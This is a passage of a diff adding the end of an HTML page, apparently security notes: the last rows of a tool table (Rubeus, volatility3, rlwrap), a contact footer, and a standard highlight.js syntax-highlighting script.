+      <tr><td>Rubeus</td><td>Kerberos ticket operations (on target)</td></tr>
+      <tr><td>volatility3</td><td>Memory forensics</td></tr>
+      <tr><td>rlwrap</td><td>Improved netcat experience</td></tr>
+    </table>
+  </div>
+</main>
+
+<footer>
+  <a href="mailto:burritosec51@gmail.com">burritosec51@gmail.com</a>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  hljs.configure({ languages: ["bash","shell","powershell","python","json","yaml","sql","xml","ini","javascript","php"] });
+  document.querySelectorAll("pre code").forEach((block) => { hljs.highlightElement(block); });
+</script>
+</body>
+</html>
